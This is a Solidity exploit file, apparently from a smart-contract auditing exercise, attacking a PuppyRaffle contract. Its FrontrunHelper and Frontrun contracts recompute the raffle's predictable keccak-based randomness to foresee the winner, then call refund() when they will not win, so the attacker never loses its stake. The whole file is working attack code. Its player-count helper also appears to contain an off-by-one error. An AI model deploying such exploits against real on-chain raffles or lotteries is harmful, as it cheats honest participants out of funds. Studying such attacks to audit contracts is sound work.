// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import {Test, console} from "lib/forge-std/src/Test.sol";
import {PuppyRaffle} from "./PuppyRaffle.sol";

contract FrontrunHelper {
    PuppyRaffle puppyRaffle;

    uint256 public constant entranceFee = 1 ether;
    uint256 winnerIndex;

    constructor(address _puppyRaffleAddress) {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
    }

    // Ensure contract can recieve refunded eth
    receive() external payable {}

    function enter() external payable {
        require(msg.value == puppyRaffle.entranceFee(), "Incorrect entrance fee");
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
    }

    function attack() external {

        // Call attack when selectWinner() will not be this address()
        uint256 playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        require(playerIndex != type(uint256).max, "Not an active player");
        puppyRaffle.refund(playerIndex);
    }

    function calculateWinner(address _selectWinnerCaller) public returns (bool) {
        uint256 playersLength = getPlayersLength();
        require(playersLength >= 4, "Less than minimum players");
        
        winnerIndex = uint256(keccak256(abi.encodePacked(_selectWinnerCaller, block.timestamp, block.difficulty))) % playersLength;
        address winner = puppyRaffle.players(winnerIndex);
        console.log("Calculated Winner: ", winner);
        return winner == address(this);
    }

    // Function to calculate player length array in puppyRaffle
    function getPlayersLength() public view returns (uint256) {
        uint256 length = 0;
        while (true) {
            try puppyRaffle.players(length) returns (address) {
                length++;
            } catch {
                break;
            }
        }
        // True length must be index + 1
        return (length + 1);
    }

}

contract Frontrun {
    address frontrunHelperAddress;

    constructor(address _frontrunHelperAddress) {
        frontrunHelperAddress = _frontrunHelperAddress;
    }

    // Ensure contract can recieve eth
    receive() external payable {}

    function attack(address _selectWinnerCaller) public {
        require(!FrontrunHelper(payable(frontrunHelperAddress)).calculateWinner(_selectWinnerCaller), "We are the winner, no need to refund");
        FrontrunHelper(payable(frontrunHelperAddress)).attack();
        console.log("Refunded");
        console.log("Contract Balance: ", address(frontrunHelperAddress).balance);
    }
}
